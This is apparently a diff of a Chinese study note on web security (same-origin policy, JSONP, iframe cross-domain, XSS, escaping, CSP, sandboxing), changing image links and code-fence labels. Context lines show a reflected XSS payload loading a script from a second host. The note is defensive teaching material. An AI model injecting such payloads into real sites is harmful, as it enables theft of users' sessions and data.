@@ -2,7 +2,7 @@
 
 ## 思维脑图
 
-<img src="./images/secuity.png" alt="web安全" />
+<img src="https://i.loli.net/2021/03/02/faoGW9DUezJZhA1.png" alt="web安全" />
 
 ## 同源策略
 
@@ -108,7 +108,7 @@ jsonp 跨域其实也是 JavaScript 设计模式中的一种代理模式。**在
 
 虽然这种方式非常好用，但是一个最大的缺陷是，只能够实现 get 请求
 
-```js
+```JavaScript
 // create script
 script = document.createElement("script");
 script.src = url;
@@ -127,7 +127,7 @@ node 中间件实现跨域代理，是通过启一个代理服务器，实现数
 
 #### **iframe 跨域**
 
-```js
+```JavaScript
 document.domain + iframe 跨域
 window.name + iframe 跨域//window.names属性值在文档刷新后依然存在的能力
 location.hash + iframe 跨域
@@ -178,7 +178,7 @@ XSS 全称是 Cross Site Scripting，为了与“CSS”区分开来，故简称 
 
 在一个反射型 XSS 攻击过程中，恶意 JavaScript 脚本属于用户发送给网站请求中的一部分，随后网站又把恶意 JavaScript 脚本返回给用户
 
-```js
+```JavaScript
 // 普通
 http://localhost:3000/?from=china
 // alert尝试
@@ -198,7 +198,7 @@ http://localhost:3000/?from=<script src="http://localhost:4000/hack.js"> </scrip
 
    - 黑名单
 
-   ```js
+   ```JavaScript
    function escape(str) {
      str = str.replace(/&/g, "&amp;");
      str = str.replace(/</g, "&lt;");
@@ -213,7 +213,7 @@ http://localhost:3000/?from=<script src="http://localhost:4000/hack.js"> </scrip
 
    - 白名单
 
-   ```js
+   ```JavaScript
    const xss = require("xss");
    let html = xss('<h1 id="title">XSS Demo</h1><script>alert("xss");</script>');
    // -> <h1>XSS Demo</h1>&lt;script&gt;alert("xss");&lt;/script&gt;
@@ -227,7 +227,7 @@ http://localhost:3000/?from=<script src="http://localhost:4000/hack.js"> </scrip
 - 禁止执行内联脚本和未授权的脚本；
 - 还提供了上报机制，这样可以帮助我们尽快发现有哪些 XSS 攻击，以便尽快修复问题。
 
-```js
+```JavaScript
 // 只允许加载本站资源
 Content-Security-Policy: default-src 'self'
 // 只允许加载 HTTPS 协议图片
@@ -323,7 +323,7 @@ DDOS 攻击指的是所有使服务器崩溃的手段
 
 我们知道安全沙箱**最小的保护单位是进程**，并且能限制进程对操作系统资源的访问和修改，这就意味着如果要让安全沙箱应用在某个进程上，那么这个进程必须没有读写操作系统的功能，比如读写本地文件、发起网络请求、调用 GPU 接口等。
 
-<img src="./images/image-20200612160419524.png" alt="image-20200612160419524" style="zoom: 80%;" />
+<img src="https://i.loli.net/2021/03/02/LMlKcvWGIAmSeUD.png" alt="image-20200612160419524" style="zoom: 80%;" />
 
 ### 持久存储
 
